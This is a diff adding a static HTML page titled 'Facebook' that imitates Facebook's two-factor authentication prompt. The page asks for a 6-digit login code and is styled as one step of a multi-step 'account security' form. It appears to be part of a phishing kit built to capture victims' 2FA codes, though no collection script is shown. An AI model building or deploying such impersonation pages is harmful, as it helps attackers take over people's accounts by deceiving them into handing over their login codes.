@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="./Image/icon.png" />
+    <link rel="stylesheet" href="Css/body.css">
+    <link rel="stylesheet" href="Css/Privacy2.css">
+</head>
+
+<body>
+    <div class="step-container">
+        <div class="multi-step-form">
+            <div class="step active">
+                <div class="account_security">
+                    <div class="mobile_header">
+                        <button class="back_header" onClick="">
+                            <i class="icon-back"></i>
+                        </button>
+                        <div class="title_header">
+                            <span>Two-factor authentication</span>
+                        </div>
+                        <div class="back_header"></div>
+                    </div>
+                    <div class="title2">
+                        <div class="icon-wrapper">
+                            <button class="event_back_step" onClick="">
+                                <i class="icon-back"></i>
+                            </button>
+                        </div>
+                        <span>Enhance account security</span>
+                    </div>
+                    <hr />
+                    <div class="text-info">
+                        <h3>Choose a way to confirm that it's you</h3>
+                        <div class="hr_block"></div>
+                        <p class="desc_text">
+                            Your account has two-factor authentication
+                            switched on, which requires this extra login
+                            step.
+                        </p>
+                        <div class="hr_block"></div>
+                        <h4 style="padding-top: 16px;">
+                            Approve from another device
+                        </h4>
+                        <p class="desc_text">
+                            We sent a notification to your logged-in devices
+                            Max. Check your Facebook notifications there and
+                            approve the login to continue.
+                        </p>
+                        <div class="hr_block"></div>
+                        <h4 style="padding-top: 16px;">
+                            Or, enter your login code
+                        </h4>
+                        <p class="desc_text" style="padding-bottom: 0px;">
+                            Enter the 6-digit code from the authentication
+                            app that you set up.
+                        </p>
+                    </div>
+
+                    <div class="login_code">
+                        <div class="login_code_wrapper">
+                            <input type="text" value="" placeholder="Login Code" />
+                        </div>
+                    </div>
+                    <p class="isValid" style="padding-left: 16px">
+                    </p>
+                    <div class="change_password" style="margin: 0px">
+                        <!-- Button active  -->
+                        <button class="button_change_password" style="margin-bottom: 0px">
+                            <span class="button-text">
+                                Continue
+                            </span>
+                        </button>
+                        <!--Button is loading  -->
+                        <!-- <button class="button_change_password loading-button" disabled
+                        style="margin-bottom: 0px">
+                        <div class="spinner"></div>
+                        <span class="button-text loading">
+                            Continue
+                        </span>
+                        </button> -->
+                    </div>
+                    <div class="reset_code">
+                        <!-- before click resend code -->
+                        <button class="button_reset_code">
+                            <span>Resend code?</span>
+                        </button>
+                        <span class="watting_time">
+                        </span>
+
+                        <!-- after click resend code -->
+                        <!-- <button class="button_reset_code active_resend_code" onClick="" disabled>
+                            <span>Resend code?</span>
+                        </button>
+                        <span class="watting_time">
+                            60s
+                        </span> -->
+                    </div>
+
+                    <div class="progressBar">
+                        <div style="width: 75%" class="progress"></div>
+                    </div>
+                    <div class="event_button_container">
+                        <div class="event_button_wrapper">
+                            <div class="progressBar_mobile">
+                                <div class="dot_mobile active"> </div>
+                                <div class="dot_mobile "> </div>
+                                <div class="dot_mobile "> </div>
+                                <div class="dot_mobile "> </div>
+                            </div>
+                            <button class="event_back" onClick="">
+                                Back
+                            </button>
+                            <button class="event_continue" onClick="">
+                                Skip
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+</body>
+
+</html>
